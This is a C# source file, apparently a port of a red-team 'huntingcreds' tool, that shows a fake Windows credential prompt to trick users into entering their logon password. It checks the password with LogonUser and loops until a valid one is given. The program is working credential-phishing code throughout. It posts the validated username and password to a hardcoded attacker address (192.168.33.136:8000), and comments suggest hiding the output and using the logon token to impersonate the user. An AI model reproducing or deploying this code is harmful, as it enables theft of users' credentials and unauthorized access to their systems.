

/*
 * ported from Delphi version https://github.com/lawrenceamer/0xsp/blob/master/huntingcreds/code.pas 
 * 0xsp SRD  / @zux0x3a 
 * https://0xsp.com   https://terminal.ired.dev 
 */



using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Collections.Specialized;


class myprogram
{

    


    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CREDUI_INFO
    {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }

    

  [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
   public static extern bool LogonUser(
  [MarshalAs(UnmanagedType.LPStr)] string pszUserName,
  [MarshalAs(UnmanagedType.LPStr)] string pszDomain,
  [MarshalAs(UnmanagedType.LPStr)] string pszPassword,
  int dwLogonType,
  int dwLogonProvider,
  out IntPtr phToken);

 



    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
         int authError,
         ref uint authPackage,
         IntPtr InAuthBuffer,
         uint InAuthBufferSize,
         out IntPtr refOutAuthBuffer,
         out uint refOutAuthBufferSize,
         ref bool fSave,
         int flags);



    [DllImport("credui.dll", CharSet = CharSet.Auto)]
    private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);




    public static void send_res(string username, string password,string url )
    {
         // https://stackoverflow.com/questions/4015324/send-http-post-request-in-net

        using (var wb = new WebClient())
        {
            var data = new NameValueCollection();
            data["username"] = username;
            data["password"] = password;


            
            var response = wb.UploadValues(url, "POST", data);
            string responseInString = Encoding.UTF8.GetString(response);
        }

        

    }
    public static bool cred_hunt()
    {
        // pinvoke has whole the shit required, just google it

        CREDUI_INFO credui = new CREDUI_INFO();
        credui.cbSize = Marshal.SizeOf(credui);
        credui.pszCaptionText = "Connect to your application";
        credui.pszMessageText = "Enter your credentials!";


        uint authPackage = 0;
        IntPtr outCredBuffer = new IntPtr();
        uint outCredSize;
        bool saved = false;

        bool gogo = false; // this will check if true for while loop 


        while (!gogo)
        {
            CredUIPromptForWindowsCredentials(ref credui, 0, ref authPackage, IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref saved, 1);


            var lusername = new StringBuilder(100);
            var lpassword = new StringBuilder(100);
            var lDomain = new StringBuilder(00);

            int lMaxUsername = 100;
            int lMaxDomainname = 100;
            int lMaxPassword = 100;


            if (CredUnPackAuthenticationBuffer(0, (IntPtr)(outCredBuffer), outCredSize,
             lusername, ref lMaxUsername,
             lDomain, ref lMaxDomainname,
             lpassword, ref lMaxPassword))
            {



                string Auser = lusername.ToString();
                string Apassword = lpassword.ToString();
                string Adomain = lDomain.ToString();


                IntPtr logonToken;
                bool St = LogonUser(
                       Auser,
                       Adomain,
                       Apassword,
                       3,
                       0,
                       out logonToken
                   );

                if (!St)
                {
                    Console.WriteLine("Login is not vaild"); // you can do loop again here 

                }
                else
                {
                    Console.WriteLine("it is vaild"); // better to omit this 
                    send_res(Auser, Apassword, "http://192.168.33.136:8000/");
                    // or you can use logontoken to impersonate 

                }


            }

           
        }
        return true;
    } 

        
    

    public static void Main()
    {

   var user_name = new StringBuilder(100);
   var user_password = new StringBuilder(100); 

   cred_hunt();

    


    }
}



